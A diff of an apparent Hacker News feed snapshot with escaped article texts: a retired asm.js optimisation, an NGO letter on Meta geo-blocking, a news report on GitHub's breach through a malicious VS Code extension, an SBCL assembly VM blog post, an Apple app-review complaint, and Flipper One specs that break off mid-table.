     &lt;p&gt;As of Firefox 148, SpiderMonkey’s asm.js optimizations are disabled by default, and we plan to remove the code entirely in a future release.&lt;/p&gt;
@@ -139,111 +367,10 @@
     &lt;quote&gt;&lt;p&gt;Then fields unsowed bear ripened fruit,&lt;/p&gt;&lt;lb/&gt;all ills grow better, and Baldr comes back;&lt;lb/&gt;Baldr and Hoth dwell in Hropt’s battle-hall. – Völuspá, Poetic Edda&lt;/quote&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://spidermonkey.dev/blog/2026/05/20/saying-goodbye-to-asmjs.html"/><published>2026-05-20T12:01:56+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48206768</id><title>Meta blocks human rights accounts from reaching audiences in Saudi Arabia, UAE</title><updated>2026-05-21T06:32:05.845318+00:00</updated><content>&lt;doc fingerprint="9ddc0399f0624111"&gt;
-  &lt;main&gt;
-    &lt;p&gt;The undersigned organisations condemn Meta’s recent decision to restrict the Facebook and Instagram accounts of independent NGOs, researchers, and civil society figures from reaching audiences in Saudi Arabia and the United Arab Emirates (UAE). This is the latest in a pattern of major technology companies, including Meta, acting as enforcement arms for repressive governments in the Gulf. We call on Meta to uphold its human rights responsibilities and ensure that users’ content is not arbitrarily restricted.&lt;/p&gt;
-    &lt;p&gt;Since 30 April 2026, Gulf-focused NGOs ALQST for Human Rights and Democratic Diwan, as well as Saudi researcher Abdullah Alaoudh and human rights defender Yahya Assiri, have had their Facebook accounts rendered “unavailable” in Saudi Arabia at the request of the Saudi government, in a form of “geo-blocking”. Similar restrictions have been imposed in the UAE, including against an academic. According to Meta's publicly available content restriction reports, over 100 Facebook pages and Instagram accounts have been restricted since March 2026. This follows a similar pattern on X (formerly Twitter). Most recently, the Saudi government requested that a number of X accounts belonging to prominent Saudi activists be geo-blocked. As of the publication date (20 May), X had not complied.&lt;/p&gt;
-    &lt;p&gt;The undersigned organisations consider these measures arbitrary, discriminatory, and a direct violation of the right to freedom of expression and access to information. Affected users were notified that Meta acted in response to a “local legal requirement” or a “request from a government” (i.e. Saudi Arabia and the UAE), demonstrating the company’s willingness to comply with demands from state authorities that routinely suppress, surveil, and criminalise online expression.&lt;/p&gt;
-    &lt;p&gt;Meta’s notifications cite compliance with “local laws”, and its reports specify the cybercrime laws of Saudi Arabia and the UAE. Authorities in Saudi Arabia and the UAE have long relied on draconian cybercrime and counterterrorism legislation to silence dissent and restrict freedom of expression online. Countless activists and peaceful critics have been arrested, tried and sentenced for expressing critical opinions in online publications or on social media, including Facebook and X.&lt;/p&gt;
-    &lt;p&gt;The reports further cite that the content allegedly violating cybercrime laws includes “reporting on regional geopolitical conflicts and security developments." Since the United States and Israel launched strikes on Iran on 28 February 2026, Gulf governments have moved swiftly to tighten the information environment even further, controlling what their populations can see, say, and share about the attacks unfolding in their countries.&lt;/p&gt;
-    &lt;p&gt;Meta claims to conduct human rights due diligence reviews before complying with government requests. We ask Meta to disclose what that review looked like for ALQST's page (and other affected accounts), who conducted it, what standards were applied, and how the company concluded that restricting a human rights organisation at the request of a government that imprisons people for social media posts is compatible with its own stated commitments.&lt;/p&gt;
-    &lt;p&gt;Meanwhile, authorities in both countries exert near total control over online information, and routinely block websites and internet accounts that might be of public interest, such as the websites of ALQST (blocked in Saudi Arabia since 2015), the Gulf Centre for Human Rights (blocked in Saudi Arabia and the UAE since 2015) and others that might contain content critical of the government or that advocate for human rights and democracy in the country. In this highly repressive context, Meta has a heightened responsibility to uphold freedom of expression and protect human rights defenders, especially from “censorship demands from governments or their proxies” as Meta publicly states in its human rights policy. Instead of preserving the free flow of information, Meta has further restricted access to it.&lt;/p&gt;
-    &lt;p&gt;Ironically, Meta’s notifications state that the company conducted legal assessments beforehand and “took into account human rights implications.” Given the well-documented pattern of digital repression by Saudi and UAE authorities, such claims are difficult to reconcile. The UN Guiding Principles on Business and Human Rights expect companies to assess whether government requests are consistent with international human rights standards before complying and to be transparent about how they reached their conclusions. The undersigned organisations therefore call on Meta to:&lt;/p&gt;
-    &lt;list rend="ul"&gt;
-      &lt;item&gt;Publish the full legal requests received from Saudi and UAE authorities along with the human rights assessments Meta claims to have conducted;&lt;/item&gt;
-      &lt;item&gt;Restore full access to all affected accounts immediately;&lt;/item&gt;
-      &lt;item&gt;Commit to notifying affected users with specific details about which content triggered the restriction and under which law; and&lt;/item&gt;
-      &lt;item&gt;Explain what role, if any, Meta's regional offices in the Gulf played in processing these requests.&lt;/item&gt;
-    &lt;/list&gt;
-    &lt;p&gt;Signatories:&lt;/p&gt;
-    &lt;list rend="ul"&gt;
-      &lt;item&gt;Access Now&lt;/item&gt;
-      &lt;item&gt;ALQST for Human Rights&lt;/item&gt;
-      &lt;item&gt;American Committee for Middle East Rights (ACMER)&lt;/item&gt;
-      &lt;item&gt;DAWN&lt;/item&gt;
-      &lt;item&gt;De|Center&lt;/item&gt;
-      &lt;item&gt;Digital Action&lt;/item&gt;
-      &lt;item&gt;Electronic Frontier Foundation&lt;/item&gt;
-      &lt;item&gt;Gulf Centre for Human Rights (GCHR)&lt;/item&gt;
-      &lt;item&gt;HuMENA for Human Rights and Civic Engagement&lt;/item&gt;
-      &lt;item&gt;MENA Rights Group&lt;/item&gt;
-      &lt;item&gt;Skyline International for Human Rights (SIHR)&lt;/item&gt;
-      &lt;item&gt;SMEX&lt;/item&gt;
-    &lt;/list&gt;
-  &lt;/main&gt;
-  &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://www.alqst.org/ar/posts/1190"/><published>2026-05-20T12:43:41+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48207660</id><title>GitHub confirms breach of 3,800 repos via malicious VSCode extension</title><updated>2026-05-21T06:32:05.457509+00:00</updated><content>&lt;doc fingerprint="8d021d1199345e32"&gt;
+&lt;/doc&gt;</content><link href="https://spidermonkey.dev/blog/2026/05/20/saying-goodbye-to-asmjs.html"/><published>2026-05-20T12:01:56+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48207660</id><title>GitHub confirms breach of 3,800 repos via malicious VSCode extension</title><updated>2026-05-21T10:28:37.309969+00:00</updated><content>&lt;doc fingerprint="8d021d1199345e32"&gt;
   &lt;main&gt;&lt;p&gt;GitHub has confirmed that roughly 3,800 internal repositories were breached after one of its employees installed a malicious VS Code extension.&lt;/p&gt;&lt;p&gt;The company has since removed the unnamed trojanized extension from the VS Code marketplace and has secured the compromised device.&lt;/p&gt;&lt;p&gt;"Yesterday we detected and contained a compromise of an employee device involving a poisoned VS Code extension. We removed the malicious extension version, isolated the endpoint, and began incident response immediately," the company said.&lt;/p&gt;&lt;p&gt;"Our current assessment is that the activity involved exfiltration of GitHub-internal repositories only. The attacker's current claims of ~3,800 repositories are directionally consistent with our investigation so far."&lt;/p&gt;&lt;p&gt;This comes after GitHub told BleepingComputer on Tuesday evening that it was investigating claims of unauthorized access to its internal repositories and added that it has no evidence that customer data stored outside the affected repos has been affected.&lt;/p&gt;&lt;p&gt;While GitHub has yet to attribute the breach, the TeamPCP hacker group claimed access to GitHub source code and "~4,000 repos of private code" on the Breached cybercrime forum on Tuesday, asking for at least $50,000 for the stolen data.&lt;/p&gt;&lt;p&gt;"As always this is not a ransom, We do not care about extorting Github, 1 buyer and we shred the data on our end, it looks like our retirement is soon so if no buyer is found we will leak it free," the cybercriminals said. "If you are interested. Send your offers to the communications below, we are not interested in under 50k, the best offer will get it."&lt;/p&gt;&lt;p&gt;TeamPCP was previously linked to massive supply chain attacks targeting developer code platforms, including GitHub, PyPI, NPM, and Docker, and, more recently, to the "Mini Shai-Hulud" supply chain campaign(which also impacted two OpenAI employees).&lt;/p&gt;&lt;p&gt;VS Code extensions are plugins that can be installed from the VS Code Marketplace (the official store for add-ons for Microsoft's code editor) to add features or integrate tools into the editor.&lt;/p&gt;&lt;p&gt;This isn't the first time a trojanized VS Code extension has been spotted on the marketplace, as multiple other malicious extensions with millions of installs have been used to steal developer credentials and other sensitive data over the last several years.&lt;/p&gt;&lt;p&gt;For instance, last year, VSCode extensions with 9 million installs were pulled over security risks, and 10 more, posing as legitimate development tools, infected users with the XMRig cryptominer.&lt;/p&gt;&lt;p&gt;Later in the year, a malicious extension with basic ransomware capabilities snuck onto the VS Code marketplace after a threat actor named WhiteCobra flooded it with 24 crypto-stealing extensions.&lt;/p&gt;&lt;p&gt;More recently, in January, two malicious extensions advertised as AI-based coding assistants with 1.5 million installs exfiltrated data from compromised developer systems to servers in China.&lt;/p&gt;&lt;p&gt;GitHub's cloud-based platform is now used by over 4 million organizations (including 90% of the Fortune 100) and more than 180 million developers who contribute to over 420 million code repositories.&lt;/p&gt;&lt;head rend="h2"&gt;The Validation Gap: Automated Pentesting Answers One Question. You Need Six.&lt;/head&gt;&lt;p&gt;Automated pentesting tools deliver real value, but they were built to answer one question: can an attacker move through the network? They were not built to test whether your controls block threats, your detection rules fire, or your cloud configs hold.&lt;/p&gt;&lt;p&gt;This guide covers the 6 surfaces you actually need to validate.&lt;/p&gt;Download Now&lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://www.bleepingcomputer.com/news/security/github-confirms-breach-of-3-800-repos-via-malicious-vscode-extension/"/><published>2026-05-20T13:43:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48209558</id><title>SBCL: the ultimate assembly code breadboard (2014)</title><updated>2026-05-21T06:32:05.233193+00:00</updated><content>&lt;doc fingerprint="ca84d170c59ac654"&gt;
-  &lt;main&gt;
-    &lt;p&gt;EDIT: Lutz Euler points out that the NEXT sequence (used to) encode an effective address with an index register but no base. The mistake doesn’t affect the meaning of the instruction, but forces a wasteful encoding. The difference in machine code are as follows.&lt;/p&gt;
-    &lt;p&gt;I fixed the definition of NEXT, but not the disassembly snippets below; they still show the old machine code.&lt;/p&gt;
-    &lt;p&gt;Earlier this week, I took another look at the F18. As usual with Chuck Moore’s work, it’s hard to tell the difference between insanity and mere brilliance ;) One thing that struck me is how small the stack is: 10 slots, with no fancy overflow/underflow trap. The rationale is that, if you need more slots, you’re doing it wrong, and that silent overflow is useful when you know what you’re doing. That certainly jibes with my experience on the HP-41C and with x87. It also reminds me of a post of djb’s decrying our misuse of x87’s rotating stack: his thesis was that, with careful scheduling, a “free” FXCH makes the stack equivalent – if not superior – to registers. The post ends with a (non-pipelined) loop that wastes no cycle on shuffling data, thanks to the x87’s implicit stack rotation.&lt;/p&gt;
-    &lt;p&gt;That lead me to wonder what implementation techniques become available for stack-based VMs that restrict their stack to, e.g., 8 slots. Obviously, it would be ideal to keep everything in registers. However, if we do that naïvely, push and pop become a lot more complicated; there’s a reason why Forth engines usually cache only the top 1-2 elements of the stack.&lt;/p&gt;
-    &lt;p&gt;I decided to mimic the x87 and the F18 (EDIT: modulo the latter’s two TOS cache registers): pushing/popping doesn’t cause any data movement. Instead, like the drawing below shows, they decrement/increment a modular counter that points to the top of the stack (TOS). That would still be slow in software (most ISAs can’t index registers). The key is that the counter can’t take too many values: only 8 values if there are 8 slots in the stack. Stack VMs already duplicate primops for performance reasons (e.g., to help the BTB by spreading out execution of the same primitive between multiple addresses), so it seems reasonable to specialise primitives for all 8 values the stack counter can take.&lt;/p&gt;
-    &lt;p&gt;In a regular direct threaded VM, most primops would end with a code sequence that jumps to the next one (NEXT), something like add rsi, 8 ; increment virtual IP before jumping jmp [rsi-8] ; jump to the address RSI previously pointed to where rsi is the virtual instruction pointer, and VM instructions are simply pointers to the machine code for the relevant primitive.&lt;/p&gt;
-    &lt;p&gt;I’ll make two changes to this sequence. I don’t like hardcoding addresses in bytecode, and 64 bits per virtual instruction is overly wasteful. Instead, I’ll encode offsets from the primop code block: mov eax, [rsi] add rsi, 4 add rax, rdi jmp rax where rdi is the base address for primops.&lt;/p&gt;
-    &lt;p&gt;I also need to dispatch based on the new value of the implicit stack counter. I decided to make the dispatch as easy as possible by storing the variants of each primop at regular intervals (e.g. one page). I rounded that up to 64 * 67 = 4288 bytes to minimise aliasing accidents. NEXT becomes something like mov eax, [rsi] add rsi, 4 lea rax, [rax + rdi + variant_offset] jmp rax&lt;/p&gt;
-    &lt;p&gt;The trick is that variant_offset = 4288 * stack_counter, and the stack counter is (usually) known when the primitive is compiled. If the stack is left as is, so is the counter; pushing a value decrements the counter and popping one increments it.&lt;/p&gt;
-    &lt;p&gt;That seems reasonable enough. Let’s see if we can make it work.&lt;/p&gt;
-    &lt;p&gt;Preliminaries&lt;/p&gt;
-    &lt;p&gt;I want to explore a problem for which I’ll emit a lot of repetitive machine code. SLIME’s REPL and SBCL’s assembler are perfect for the task! (I hope it’s clear that I’m using unsupported internals; if it breaks, you keep the pieces.)&lt;/p&gt;
-    &lt;p&gt;The basic design of the VM is:&lt;/p&gt;
-    &lt;p&gt;r8-r15: stack slots (32 bits);&lt;/p&gt;
-    &lt;p&gt;rsi: base address for machine code primitives;&lt;/p&gt;
-    &lt;p&gt;rdi: virtual instruction pointer (points to the next instruction);&lt;/p&gt;
-    &lt;p&gt;(import '(sb-assem:inst sb-vm::make-ea)) ; we'll use these two a lot ;; The backing store for our stack (defvar *stack* (make-array 8 :initial-contents (list sb-vm::r8d-tn sb-vm::r9d-tn sb-vm::r10d-tn sb-vm::r11d-tn sb-vm::r12d-tn sb-vm::r13d-tn sb-vm::r14d-tn sb-vm::r15d-tn))) ;; The _primop-generation-time_ stack pointer (defvar *stack-pointer*) ;; (@ 0) returns the (current) register for TOS, (@ 1) returns ;; the one just below, etc. (defun @ (i) (aref *stack* (mod (+ i *stack-pointer*) (length *stack*)))) (defvar *code-base* sb-vm::rsi-tn) (defvar *virtual-ip* sb-vm::rdi-tn) (defvar *rax* sb-vm::rax-tn) (defvar *rbx* sb-vm::rax-tn) (defvar *rcx* sb-vm::rax-tn) (defvar *rdx* sb-vm::rax-tn) ;; Variants are *primitive-code-offset* bytes apart (defvar *primitive-code-offset* (* 64 67)) ;; Each *stack-pointer* value gets its own code page (defstruct code-page (alloc 0) ; index of the next free byte. (code (make-array *primitive-code-offset* :element-type '(unsigned-byte 8))))&lt;/p&gt;
-    &lt;p&gt;The idea is that we’ll define functions to emit assembly code for each primitive; these functions will be implicitly parameterised on *stack-pointer* thanks to @. We can then call them as many times as needed to cover all values of *stack-pointer*. The only complication is that code sequences will differ in length, so we must insert padding to keep everything in sync. That’s what emit-code does:&lt;/p&gt;
-    &lt;p&gt;(defun emit-code (pages emitter) ;; there must be as many code pages as there are stack slots (assert (= (length *stack*) (length pages))) ;; find the rightmost starting point, and align to 16 bytes (let* ((alloc (logandc2 (+ 15 (reduce #'max pages :key #'code-page-alloc)) 15)) (bytes (loop for i below (length pages) for page = (elt pages i) collect (let ((segment (sb-assem:make-segment)) (*stack-pointer* i)) ;; assemble the variant for this value ;; of *stack-pointer* in a fresh code ;; segment (sb-assem:assemble (segment) ;; but first, insert padding (sb-vm::emit-long-nop segment (- alloc (code-page-alloc page))) (funcall emitter)) ;; tidy up any backreference (sb-assem:finalize-segment segment) ;; then get the (position-independent) machine ;; code as a vector of bytes (sb-assem:segment-contents-as-vector segment))))) ;; finally, copy each machine code sequence to the right code page (map nil (lambda (page bytes) (let ((alloc (code-page-alloc page))) (replace (code-page-code page) bytes :start1 alloc) (assert (&amp;lt;= (+ alloc (length bytes)) (length (code-page-code page)))) (setf (code-page-alloc page) (+ alloc (length bytes))))) pages bytes) ;; and return the offset for that code sequence alloc))&lt;/p&gt;
-    &lt;p&gt;This function is used by emit-all-code to emit the machine code for a bunch of primitives, while tracking the start offset for each primitive.&lt;/p&gt;
-    &lt;p&gt;These are relatively tight. I certainly like how little data shuffling there is; the NEXT sequence is a bit hairy, but the indirect branch is likely its weakest (and least avoidable) point.&lt;/p&gt;
-    &lt;p&gt;Control flow primops&lt;/p&gt;
-    &lt;p&gt;A VM without control flow isn’t even a toy. First, unconditional relative jumps. These can be encoded as [jmp] [offset], with the 32 bit offset relative to the end of offset. We just overwrite *virtual-ip* with the new address.&lt;/p&gt;
-    &lt;p&gt;We finally almost have enough for interesting demos. The only important thing that’s still missing is calls from CL into the VM. I’ll assume that the caller takes care of saving any important register, and that the primop (rsi) and virtual IP (rdi) registers are setup correctly. The stack will be filled on entry, by copying values from the buffer rax points to, and written back on exit.&lt;/p&gt;
-    &lt;p&gt;12345678910111213141516171819&lt;/p&gt;
-    &lt;p&gt;(defun enter () (inst push sb-vm::rbp-tn) (inst mov sb-vm::rbp-tn sb-vm::rsp-tn) ; setup a normal frame (inst push *rax*) ; stash rax (dotimes (i 8) ; copy the stack in (inst mov (@ i) (make-ea :dword :base *rax* :disp (* 4 i)))) (next)) (defun leave () ;; restore RAX (inst mov *rax* (make-ea :qword :base sb-vm::rbp-tn :disp -8)) ;; overwrite the output stack (dotimes (i 8) (inst mov (make-ea :dword :base *rax* :disp (* 4 i)) (@ i))) ;; and unwind the frame (inst mov sb-vm::rsp-tn sb-vm::rbp-tn) (inst pop sb-vm::rbp-tn) (inst ret))&lt;/p&gt;
-    &lt;p&gt;The CL-side interlocutor of enter follows, as a VOP:&lt;/p&gt;
-    &lt;p&gt;We can now either write (basically) straightline code or infinite loops. We need conditionals. Their implementation is much like jmp, with a tiny twist. Let’s start with jump if (top of stack is) non-zero and jump if zero.&lt;/p&gt;
-    &lt;p&gt;1234567891011121314151617&lt;/p&gt;
-    &lt;p&gt;(defun jcc (cc) ;; next word is the offset if the condition is met, otherwise, ;; fall through. (inst movsx *rax* (make-ea :dword :base *virtual-ip*)) (inst lea *rax* (make-ea :dword :base *virtual-ip* :index *rax* :disp 4)) (inst add *virtual-ip* 4) (inst test (@ 0) (@ 0)) ;; update *virtual-ip* only if zero/non-zero (inst cmov cc *virtual-ip* *rax*) (next)) (defun jnz () (jcc :nz)) (defun jz () (jcc :z))&lt;/p&gt;
-    &lt;p&gt;Immediates&lt;/p&gt;
-    &lt;p&gt;It’s hard to write programs without immediate values. Earlier control flow primitives already encode immediate data in the virtual instruction stream. We’ll do the same for lit, inc, and dec:&lt;/p&gt;
-    &lt;p&gt;123456789101112&lt;/p&gt;
-    &lt;p&gt;(defun lit () (decf *stack-pointer*) ; grow the stack (inst mov (@ 0) (make-ea :dword :base *virtual-ip*)) ; load the next word (next 4)) ; and skip to the next instruction (defun inc () (inst add (@ 0) (make-ea :dword :base *virtual-ip*)) (next 4)) (defun dec () (inst sub (@ 0) (make-ea :dword :base *virtual-ip*)) (next 4))&lt;/p&gt;
-    &lt;p&gt;My first loop&lt;/p&gt;
-    &lt;p&gt;Finally, we have enough for a decent-looking (if useless) loop. First, update the primop code page:&lt;/p&gt;
-    &lt;p&gt;12345678&lt;/p&gt;
-    &lt;p&gt;;; C-M-x to force re-evaluation, or defparameter (defvar *primops* '(enter leave lit swap dup drop add sub inc dec jmp jnz jz call ret)) (defvar *primops-offsets* (assemble-primops))&lt;/p&gt;
-    &lt;p&gt;12345678910&lt;/p&gt;
-    &lt;p&gt;CL-USER&amp;gt; (vm '(1000000) (assemble '(lit 1 sub jnz -20 leave)) *code-page*) Evaluation took: 0.009 seconds of real time 0.009464 seconds of total run time (0.009384 user, 0.000080 system) 100.00% CPU 14,944,792 processor cycles 0 bytes consed #(0 0 0 0 0 0 0 1)&lt;/p&gt;
-    &lt;p&gt;One million iterations of this stupid loop that only decrements a counter took 15M cycles. 15 cycles/iteration really isn’t that bad… especially considering that it executes an indirect jump after loading 1, after subtracting, and after comparing with 0.&lt;/p&gt;
-    &lt;p&gt;We can do better by fusing lit sub into dec:&lt;/p&gt;
-    &lt;p&gt;12345678910&lt;/p&gt;
-    &lt;p&gt;CL-USER&amp;gt; (vm '(1000000) (assemble '(dec 1 jnz -16 leave)) *code-page*) Evaluation took: 0.007 seconds of real time 0.006905 seconds of total run time (0.006848 user, 0.000057 system) 100.00% CPU 11,111,128 processor cycles 0 bytes consed #(0 0 0 0 0 0 0 0)&lt;/p&gt;
-    &lt;p&gt;Fuse all the things!&lt;/p&gt;
-    &lt;p&gt;Decrementing a counter and jumping if non zero is a common operation (old x86 even implemented that in hardware, with loop). Let’s add decrement and jump if non-zero (djn) to the VM:&lt;/p&gt;
-    &lt;p&gt;CL-USER&amp;gt; (vm '(1000000) (assemble '(djn -8 leave)) *code-page*) Evaluation took: 0.005 seconds of real time 0.005575 seconds of total run time (0.005542 user, 0.000033 system) 120.00% CPU 8,823,896 processor cycles 0 bytes consed #(0 0 0 0 0 0 0 0)&lt;/p&gt;
-    &lt;p&gt;That’s better… But I’m really not convinced by the conditional move. The branch will usually be predictable, so it makes sense to expose that to the hardware and duplicate the NEXT sequence.&lt;/p&gt;
-    &lt;p&gt;12345678910&lt;/p&gt;
-    &lt;p&gt;(defun djn2 () (sb-assem:assemble () (inst sub (@ 0) 1) (inst jmp :z fallthrough) (inst movsx *rax* (make-ea :dword :base *virtual-ip*)) (inst lea *virtual-ip* (make-ea :dword :base *virtual-ip* :index *rax* :disp 8)) (next -4) ; might as well pre-increment *virtual-ip* fallthrough ; ASSEMBLE parses for labels, like TAGBODY (next 4)))&lt;/p&gt;
-    &lt;p&gt;The resulting code isn’t too large, and the two indirect jumps are 16 bytes apart.&lt;/p&gt;
-    &lt;p&gt;This alternative implementation does work better on our stupid loop.&lt;/p&gt;
-    &lt;p&gt;12345678910&lt;/p&gt;
-    &lt;p&gt;CL-USER&amp;gt; (vm '(1000000) (assemble '(djn2 -8 leave)) *code-page*) Evaluation took: 0.004 seconds of real time 0.004034 seconds of total run time (0.003913 user, 0.000121 system) 100.00% CPU 6,183,488 processor cycles 0 bytes consed #(0 0 0 0 0 0 0 0)&lt;/p&gt;
-    &lt;p&gt;Let’s see how that compares to straight assembly code.&lt;/p&gt;
-    &lt;p&gt;123456&lt;/p&gt;
-    &lt;p&gt;(defun ubench () (sb-assem:assemble () head (inst sub (@ 0) 1) (inst jmp :nz head) (next)))&lt;/p&gt;
-    &lt;p&gt;12345678910&lt;/p&gt;
-    &lt;p&gt;CL-USER&amp;gt; (vm '(1000000) (assemble '(ubench leave)) *code-page*) Evaluation took: 0.000 seconds of real time 0.000629 seconds of total run time (0.000628 user, 0.000001 system) 100.00% CPU 1,001,904 processor cycles 0 bytes consed #(0 0 0 0 0 0 0 0)&lt;/p&gt;
-    &lt;p&gt;My slow macbook air gets 1 iteration/cycle on a loop that’s 100% control overhead. With djn2, a good implementation of a reasonable specialised operator, the loop is about 6x as slow as native code. A worse implementation of djn is still only 8x as slow as pure native code, and horribly unspecialised bytecode is 11-15x as slow as native code.&lt;/p&gt;
-    &lt;p&gt;Verdict&lt;/p&gt;
-    &lt;p&gt;Specialising primops to a virtual stack pointer is feasible in practice, when the stack is restricted to a small size. It also seems to have a reasonable runtime overhead for threaded interpreters. I’m not actually interested in straight stack languages; however, I believe that a fixed stack VM makes a nice runtime IR, when coupled with a mechanism for local variables. We’ll see if I find time to translate a high level language into superoperators for such a VM. Fused operators would reduce the importance of NEXT; in constrast, simpler function calls (because there’s less shuffling of items to stack them up in the right position) would remain as useful.&lt;/p&gt;
-    &lt;p&gt;SBCL has definitely proven itself to be a good companion to explore the generation of domain-specific machine code. I don’t know of any other language implementation with that kind of support for interactive programming and machine code generation (and inspection). FWIW, I believe LuaJIT + dynasm will soon be comparable.&lt;/p&gt;
-    &lt;p&gt;Steel Bank Common Lisp: because sometimes C abstracts away too much ;)&lt;/p&gt;
-  &lt;/main&gt;
-  &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://pvk.ca/Blog/2014/03/15/sbcl-the-ultimate-assembly-code-breadboard/"/><published>2026-05-20T15:39:48+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48211134</id><title>Why is Inkwell stuck in review</title><updated>2026-05-21T06:32:04.891110+00:00</updated><content>&lt;doc fingerprint="a704b91928268d7d"&gt;
+&lt;/doc&gt;</content><link href="https://www.bleepingcomputer.com/news/security/github-confirms-breach-of-3-800-repos-via-malicious-vscode-extension/"/><published>2026-05-20T13:43:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48210226</id><title>OpenAI Is Preparing to File for an IPO Soon</title><updated>2026-05-21T10:28:37.094565+00:00</updated><content/><link href="https://www.wsj.com/tech/ai/openai-is-preparing-to-file-for-an-ipo-very-soon-0ec95af5"/><published>2026-05-20T16:24:42+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48211134</id><title>Why is Inkwell stuck in review</title><updated>2026-05-21T10:28:36.707553+00:00</updated><content>&lt;doc fingerprint="a704b91928268d7d"&gt;
   &lt;main&gt;
     &lt;p&gt;I submitted Inkwell for iOS to Apple for review on April 21st. It has gone through numerous rejections, code changes, resubmissions, clarifications, one phone call, and one appeal to the review board, which I’m still waiting to hear back on.&lt;/p&gt;
     &lt;p&gt;What’s the hold up? I’ve hinted at some of the issues, but I’ve tried hard to be patient with Apple, so I’ve mostly kept my mouth shut while waiting. I’m getting discouraged, though, so it’s time to lay out the problems here, organized by App Review Guideline section numbers:&lt;/p&gt;
@@ -261,7 +388,7 @@
     &lt;p&gt;I haven’t decided yet if this is a hill I’m willing to die on. But philosophically, I have a big problem with Apple using their control over iOS app distribution to reach beyond the law. The trademark has been unused for literal decades. Yet Apple has all the power.&lt;/p&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://www.manton.org/2026/05/19/why-is-inkwell-stuck-in.html"/><published>2026-05-20T17:30:15+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48211409</id><title>Qian Xuesen: The missile genius America lost and China gained (2025)</title><updated>2026-05-21T06:32:04.667459+00:00</updated><content/><link href="https://www.usni.org/magazines/naval-history/2025/december/missile-genius-america-lost-and-china-gained"/><published>2026-05-20T17:48:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48212046</id><title>Flipper One Tech Specs</title><updated>2026-05-21T06:32:04.281416+00:00</updated><content>&lt;doc fingerprint="66cb9dd6730abfe8"&gt;
+&lt;/doc&gt;</content><link href="https://www.manton.org/2026/05/19/why-is-inkwell-stuck-in.html"/><published>2026-05-20T17:30:15+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48211409</id><title>Qian Xuesen: The missile genius America lost and China gained (2025)</title><updated>2026-05-21T10:28:36.477834+00:00</updated><content/><link href="https://www.usni.org/magazines/naval-history/2025/december/missile-genius-america-lost-and-china-gained"/><published>2026-05-20T17:48:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48212046</id><title>Flipper One Tech Specs</title><updated>2026-05-21T10:28:36.274032+00:00</updated><content>&lt;doc fingerprint="66cb9dd6730abfe8"&gt;
   &lt;main&gt;
     &lt;head rend="h1"&gt;Tech specs&lt;/head&gt;
     &lt;p&gt; this page describes the full technical specifications of the flipper one since the device is under active development, specifications may change flipper one outline size and weight ⚠️ final weight is pending — value below is a placeholder flipper one — front view with dimensions width 155 mm (6 1 inches) height 67 mm (2 64 inches) depth 40 mm (1 57 inches) weight tbd grams (tbd ounces) materials flipper one materials body pc/abs buttons pc/abs screen gorilla glass heat sink anodized aluminum bracket anodized aluminum lanyard loop anodized aluminum bumpers tpu monochrome lcd display resolution 256 × 144 pixels grayscale 64 levels (6 bit) interface qspi (driven by mcu) ports flipper one top and back ports flipper one audio port and usb c1 flipper one ethernet ports flipper one microsd and sim slots usb c1 usb 3 1 (5 gbps), displayport alt mode, usb power delivery charging usb c2 usb 3 1 (5 gbps), host only, power out usb a usb 3 1 (5 gbps), host only, power out hdmi out full size, v2 1, cec support, 4k @ 120 hz ethernet 2× rj45, gigabit 3 5 mm audio jack stereo out and microphone input (trrs) microsd card slot sim card slot nano sim (4ff), passively connected to m 2 port controls flipper one controls touchpad fast scrolling, haptic feedback app buttons 5 buttons below the screen power button power on / sleep / off, ctrl+alt+del menu, kill app 5 button d pad directional navigation back button return app switcher single click = alt+tab, double click = extra menu push to talk (ptt) button controllable in linux userspace main cpu — rk3576 flipper one cpu and mcu cpu rockchip rk3576 cores 8 — 4× high performance arm cortex a72 + 4× efficiency arm cortex a53, up to 2 2 ghz gpu arm mali g52 mc3 — opengl es 1 1/2 0/3 2, opencl 2 1, vulkan 1 2 npu 6 tops @int8 — supports int4, int8, int16, fp16, bf16, tf32 low power mcu — rp2350 mcu raspberry pi rp2350b cores dual arm cortex m33 @ 150 mhz + dual risc v hazard3 @ 150 mhz sram 520 kb flash 16 mb memory and storage ram 8 gb lpddr5 internal storage 64 gb ufs 2 2 microsd card slot ⚠️ (uhs i sdr104 — needs verification) battery and power battery energy 24000 mwh battery capacity 7000 mah ⚠️ (not final) charger ic ti bq25792, up to 3 32 a fuel gauge ti bq28z610 charging usb c power delivery, up to 26 v wi fi &amp;amp; bluetooth module wxt2am2101 wi fi chipset mediatek mt7921aun wi fi modes wi fi 6 (802 11ax), 2 4 / 5 / 6 ghz bands, 2×2 mimo bluetooth 5 2 (integrated in mt7921u) gigabit ethernet ports 2× ethernet (1 gbit/s) phy ic realtek rtl8211f cg video output hdmi v2 1, full size connector (type a), cec support, up to 4k\@120 hz displayport v1 4 alt mode via usb c1, up to 4k\@120 hz audio codec nuvoton nau8822 speaker ⚠️ needs clarification 3 5 mm jack stereo out + microphone input (trrs) m 2 expansion port the m 2 expansion port is at the back of the device, under the back plate flipper one m 2 expansion port m 2 type key b supported sizes 2242, 3042, 3052 supported thickness up to d3 (double sided modules) interfaces pcie 2 1 ×1 / usb 2 0 / usb 3 1 / sata3 / serial audio / uart / i2c / sim card m 2 port pinout flipper one m 2 port pinout description pin pin description — — 1 config 3 3 3v 2 3 gnd 3 3v 4 5 gnd full card power off# (o)(0/1 8v or 3 3v) 6 7 usb d+ w disable1# (o)(0/1 8v/3 3v) 8 9 usb d gpio 9/das/dss (i/o)/led 1# (i)(0/3 3v) 10 11 gnd connector key b — — connector key b gpio 5 (i/o)(0/1 8v) 